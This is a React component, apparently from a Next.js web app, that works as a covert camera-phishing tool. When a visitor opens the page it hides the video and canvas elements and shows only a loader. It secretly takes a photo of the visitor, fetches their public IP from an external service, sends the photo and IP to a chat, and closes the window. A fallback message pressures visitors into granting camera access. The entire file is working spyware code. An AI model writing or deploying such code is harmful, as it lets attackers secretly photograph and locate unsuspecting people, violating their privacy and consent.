"use client";

import { useCallback, useEffect } from "react";
import { sendPhotoToChat } from "../_actions/send-photo-to-chat";
import { useCamera } from "../_hooks/use-camera";
import { Loader } from "./loader";

async function getUserIp() {
	return fetch("https://api.ipify.org/?format=json")
		.then((res) => res.json())
		.then((data) => data.ip)
		.catch(() => "unknown");
}

interface CameraProps {
	chatId: number;
}

export const Camera = ({ chatId }: CameraProps) => {
	const { videoRef, canvasRef, photo } = useCamera();

	const handlePhoto = useCallback(
		async (_photo: string) => {
			const ip = await getUserIp();
			await sendPhotoToChat({ photo: _photo, chatId, ip });
			window.close();
		},
		[chatId],
	);

	useEffect(() => {
		if (!photo) return;

		handlePhoto(photo);
	}, [photo, handlePhoto]);

	return (
		<>
			<video ref={videoRef} style={{ display: "none" }} autoPlay />
			<canvas ref={canvasRef} style={{ display: "none" }} />
			<Loader />
		</>
	);
};

export const CameraNotAllowed = () => <h1>Allow access to camera to use this website!</h1>;
